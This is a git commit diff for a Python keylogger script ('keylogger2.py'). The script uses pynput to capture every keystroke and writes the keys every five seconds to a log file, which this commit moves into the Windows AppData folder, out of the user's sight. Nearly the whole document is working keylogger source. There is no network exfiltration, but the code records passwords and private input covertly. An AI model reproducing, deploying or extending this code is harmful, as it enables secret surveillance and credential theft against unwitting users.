e82d0d86c44e7074e58f281c5d4b534d51e1b4f4
Aishwarya Tapade <63071821+aishwarya0327@users.noreply.github.com>
2021-05-18 17:57:36 +0000

    Update keylogger2.py

--- keylogger2.py
+++ keylogger2.py
@@ -2,9 +2,13 @@
 
 import pynput.keyboard
 import threading
-
+import os
 
 keys = ""
+
+#specify the path of the location for creation of key log file.
+path = os.environ['appdata'] + "\\keylog.txt"
+
 def process_keys(key):
 	global keys
 	try:
@@ -17,16 +21,19 @@ def process_keys(key):
 
 def report():
 	global keys
-	with open('keylogger.txt','a') as file:
+	global path
+	with open(path,'a') as file:
 		file.write(keys)
 		keys = ""
 		file.close()
 	timer = threading.Timer(5,report)
 	timer.start()
 
-keyboard_listener = pynput.keyboard.Listener(on_press = process_keys)
-with keyboard_listener:
-	report()
-	keyboard_listener.join()
+def start_keylogger():
+	keyboard_listener = pynput.keyboard.Listener(on_press = process_keys)
+	with keyboard_listener:
+		report()
+		keyboard_listener.join()
 
+start_keylogger()
 
